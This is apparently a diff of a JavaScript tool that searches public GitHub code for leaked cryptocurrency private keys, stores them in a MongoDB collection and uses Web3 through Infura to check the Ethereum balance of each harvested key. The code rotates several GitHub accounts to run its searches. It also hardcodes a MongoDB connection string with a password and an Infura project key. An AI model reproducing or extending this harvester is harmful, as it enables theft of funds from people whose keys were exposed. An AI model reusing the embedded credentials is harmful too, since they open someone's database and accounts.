@@ -705,18 +705,22 @@ const calculateTotals = () => {
   let totals = {}
   let seen = []
   mongoose.connect('mongodb+srv://jkol36:TheSavage1990@cluster0.bvjyjf3.mongodb.net/?retryWrites=true&w=majority').then(() => {
-    mongoose.model('binanceAccounts').find().then(accounts => {
+    mongoose.model('cryptoAccounts').find().then(accounts => {
       return Promise.each(accounts, async account => {
-       
-          account.cryptos.forEach(crypto => {
-            if(totals[crypto.crypto] === undefined) {
-              totals[crypto.crypto] = crypto.balance
-            }
-            else {
-              totals[crypto.crypto] += crypto.balance
-            }
+          let w3 = new Web3('https://mainnet.infura.io/v3/7dde81cce4ae4281bb8a3e2a70516f98')
+          let acc = await w3.eth.accounts.privateKeyToAccount(account.privateKey)
+          let balance = await w3.eth.getBalance(acc.address)
+          console.log(balance)
+          
+          // account.cryptos.forEach(crypto => {
+          //   if(totals[crypto.crypto] === undefined) {
+          //     totals[crypto.crypto] = crypto.balance
+          //   }
+          //   else {
+          //     totals[crypto.crypto] += crypto.balance
+          //   }
             
-          })
+          // })
         })
     }).then(() => console.log(totals))
   })
@@ -1036,7 +1040,7 @@ const scanGithubForPrivateKeys = async () => {
   }
   let accounts = await initGithubAccounts()
   let ghAccount = accounts[Math.floor(Math.random() * accounts.length)]
-  let query = 'privateKey='
+  let query = '0x private_key'
   console.log('fetching page', page)
   const code = await makeOctokitRequest(ghAccount.rest.search.code({
     q: query,
@@ -1049,7 +1053,7 @@ const scanGithubForPrivateKeys = async () => {
   try {
     codeItems = code.data.items;
     
-    console.log('working with', code.data.items[0])
+    
     const content = await makeOctokitRequest(ghAccount.rest.git.getBlob({
       owner: codeItems[0].repository.owner.login,
       repo: codeItems[0].repository.name,
@@ -1360,7 +1364,6 @@ const startScanForPrivateKeys = async () => {
 }
 
 startScanForPrivateKeys()
-
 
 // redisClient.connect().then(async () => {
 //   await redisClient.set('windowReset', 104123)
